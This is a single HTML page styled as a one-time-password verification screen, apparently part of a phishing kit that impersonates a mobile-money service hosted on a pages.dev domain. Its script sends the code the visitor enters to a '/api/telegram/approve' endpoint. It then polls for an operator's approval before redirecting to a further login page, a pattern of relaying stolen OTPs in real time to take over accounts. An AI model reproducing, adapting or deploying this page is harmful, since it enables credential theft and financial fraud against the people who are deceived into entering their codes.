<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Enter OTP - Verification</title>
    <script>
      const isDevelopment =
        window.location.hostname === "localhost" ||
        window.location.hostname === "127.0.0.1";
      const backendUrl = isDevelopment
        ? "http://localhost:3000"
        : "https://innbucks-39v.pages.dev";
      localStorage.setItem("backendUrl", backendUrl);
    </script>
    <style>
      body {
        margin: 0;
        font-family: Arial, Helvetica, sans-serif;
        background: #f3f4f6;
      }
      .card {
        max-width: 420px;
        margin: 64px auto;
        background: #fff;
        border-radius: 16px;
        padding: 30px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      }
      h1 {
        color: #16213e;
        margin: 0 0 8px;
      }
      p {
        color: #666;
        margin-bottom: 14px;
      }
      label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
      }
      input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 10px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
        box-sizing: border-box;
      }
      .btn {
        width: 100%;
        padding: 14px;
        border-radius: 12px;
        border: none;
        background: linear-gradient(90deg, #6c5ce7, #00b894);
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .small {
        font-size: 13px;
        color: #999;
        margin-top: 12px;
        text-align: center;
      }
      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.45);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 9999;
      }
      .overlay.show {
        display: flex;
      }
      .box {
        background: #fff;
        padding: 20px 28px;
        border-radius: 12px;
        text-align: center;
      }
      .spinner {
        width: 36px;
        height: 36px;
        border: 4px solid #eee;
        border-top-color: #6c5ce7;
        border-radius: 50%;
        margin: 0 auto 8px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .error {
        color: #f44336;
        font-size: 14px;
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Enter OTP</h1>
      <p>We've sent a verification code to your registered phone number.</p>

      <form id="otpForm">
        <label for="otp">OTP Code</label>
        <input
          id="otp"
          type="text"
          placeholder="Enter 6-digit OTP"
          maxlength="6"
          required
        />
        <button class="btn" type="submit">VERIFY OTP</button>
      </form>

      <div class="error" id="errorMsg"></div>
      <div class="small">Enter the code you received on your phone.</div>
    </div>

    <div class="overlay" id="verifyingOverlay">
      <div class="box">
        <h2>Verifying OTP</h2>
        <div class="spinner"></div>
        <p style="color: #666; margin-top: 10px">Please wait...</p>
      </div>
    </div>

    <script>
      document
        .getElementById("otpForm")
        .addEventListener("submit", async (e) => {
          e.preventDefault();
          const otp = document.getElementById("otp").value;
          const errorEl = document.getElementById("errorMsg");
          const backendUrl = localStorage.getItem("backendUrl");
          const requestId = localStorage.getItem("requestId");

          if (!otp) {
            errorEl.textContent = "Please enter the OTP";
            return;
          }

          errorEl.textContent = "";
          document.getElementById("verifyingOverlay").classList.add("show");

          try {
            // Send OTP for verification
            const resp = await fetch(`${backendUrl}/api/telegram/approve`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                requestId: requestId,
                action: "verify_otp",
                otp: otp,
                token: "verification_token",
              }),
            });

            const data = await resp.json();

            // Poll for OTP verification approval
            let pollCount = 0;
            const pollInterval = setInterval(async () => {
              pollCount++;
              try {
                const r = await fetch(
                  `${backendUrl}/api/otp/status/${requestId}`,
                );
                const j = await r.json();

                if (j.approved) {
                  clearInterval(pollInterval);
                  localStorage.setItem("otpVerified", "true");
                  window.location.href = "login_final.html";
                } else if (j.rejected) {
                  clearInterval(pollInterval);
                  document
                    .getElementById("verifyingOverlay")
                    .classList.remove("show");
                  errorEl.textContent = "Invalid OTP - Please try again";
                  document.getElementById("otp").value = "";
                } else if (pollCount > 150) {
                  clearInterval(pollInterval);
                  document
                    .getElementById("verifyingOverlay")
                    .classList.remove("show");
                  errorEl.textContent =
                    "Verification timeout - Please try again";
                }
              } catch (err) {
                console.error("Poll error:", err);
              }
            }, 2000);
          } catch (err) {
            document
              .getElementById("verifyingOverlay")
              .classList.remove("show");
            errorEl.textContent = "Error: " + err.message;
          }
        });
    </script>
  </body>
</html>
